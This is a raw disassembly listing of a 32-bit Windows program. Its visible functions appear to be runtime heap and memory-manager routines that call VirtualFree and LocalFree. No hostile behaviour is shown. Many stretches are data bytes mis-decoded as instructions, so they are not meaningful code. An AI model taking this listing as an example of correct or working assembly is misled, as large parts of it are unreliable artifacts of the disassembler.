sub_4010aa
call [ eax + r-xdata ]
add al 0x6
inc esp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] eax
insb
add [ gs : ebp + 0x10c00040 ] ecx
inc eax
add [ eax + ecx ] al
inc ebx
jne r-xdata
add al 0xf8
je r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jb r-xdata
inc esp
and al 0x4
clc
jmp r-xdata
insd
add [ eax ] al
adc [ ecx ] 0x40
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
outsb
arpl [ ecx + 0x4 ] di
nop
rcl [ eax ] 0x1
inc eax
add [ edx ] cl
push es
push ebx
je r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d0
test al al
je r-xdata
jmp sub_405a70
jb r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x11 ] si
inc eax
add [ edi ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
in al dx
adc [ eax ] al
or al 0x7
mov eax 0x80004002
xor eax eax
jmp r-xdata
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
je r-xdata
popad
outsb
je r-xdata
pop ebx
pop ebp
retn 0xc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
add [ eax ] al
add [ eax ] al
inc esi
std
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
js r-xdata
je r-xdata
inc eax
add [ ecx ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
add [ ecx ] al
add al 0x57
outsd
jb r-xdata
inc eax
add ah bh
adc [ eax ] al
or al 0xa
dec edi
insb
push esi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ ecx ] cl
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x12 ] bh
je r-xdata
push esi
popad
jb r-xdata
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sub [ edx + 0x40 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add al 0x0
popad
jb r-xdata
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x81
inc edi
add [ ebx - 0x27da0040 ] cl
add [ edi ] 0x25ffc08b
mov al 0x81
inc edi
add [ ebx - 0x2bda0040 ] cl
add [ edi ] 0x25ffc08b
lodsb [ esi ]
add [ edi ] 0x25ffc08b
test al 0x81
inc edi
add [ ebx - 0x5bda0040 ] cl
add [ edi ] 0x25ffc08b
mov al [ 0xffffffff8b004781 ]
sar bh 0x25
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
nop
adc al [ eax ]
adc [ ebx ] ecx
push esp
inc edx
outsd
jne r-xdata
and eax FindClose@IAT
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_0(kernel32:FindFirstFileA)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_401324
add [ eax ] al
add [ eax ] al
je r-xdata
pushfd
add [ edi ] 0x25ffc08b
cwde
add [ edi ] 0x25ffc08b
xchg esp eax
add [ edi ] 0x25ffc08b
nop
add [ edi ] 0x25ffc08b
mov [ ecx - 0x3f74ffb9 ] es
jmp [ __import_lookup_table_0(kernel32:GetThreadLocale) ]
inc edi
add [ ebx - 0x5fda0040 ] cl
add [ edi ] 0x25ffc08b
insd
mov eax 0x4004012
or [ esp + eax * 2 + 0x61 ] edx
je sub_401324
push esp
imul ebp [ ebp + 0x65 ] 0xc425ff01
add [ edi ] 0x25ffc08b
rol [ ecx - 0x3f74ffb9 ] 0xff
and eax __import_lookup_table_0(kernel32:RtlUnwind)
mov eax eax
jmp [ __import_lookup_table_0(kernel32:UnhandledExceptionFilter) ]
sub_401440
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401400
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401498
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401440
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4014e0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014c8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014c8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401498
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401550
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401498
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014c8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4015e4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401498
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401410
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401648
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401410
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401410
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401498
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4016c0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014c8
mov [ rw-data ] 0x1
sub_401778
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401410
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40180c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_40188c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_4015e4
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_401778
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_4014e0
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016c0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014c8
jmp r-xdata
sub_40191c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401648
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014e0
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401648
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016c0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014e0
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_401778
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016c0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014c8
jmp r-xdata
sub_401a40
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40180c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_4014e0
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016c0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401550
jmp r-xdata
sub_401acc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b82
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401420
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_401490
mov eax rw-data
call sub_401490
mov eax rw-data
call sub_401490
push 0xff8
push 0x0
call sub_401400
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401428
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b89
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401430
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401b90
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c66
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401428
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_401490
mov eax rw-data
call sub_401490
mov eax rw-data
call sub_401490
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401438
retn
push rw-data
call sub_401430
sub_401c70
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401cd4
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401d04
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401ed8
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d58
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d34
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d80
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c70
add ebx esi
mov [ rw-data ] 0x6
sub_401df0
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c70
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e28
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401cd4
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a40
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a40
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401d04
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401550
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d58
sub_401ed8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e28
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f60
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d34
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401fac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f60
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_4014e0
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d80
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401df0
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401d04
sub [ edi + 0x4 ] 0x4
sub_402038
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40188c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fac
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_402064
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40191c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fac
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402098
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020c4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c70
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401ed8
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402038
test al al
jne r-xdata
mov eax esi
call sub_402098
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4021b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
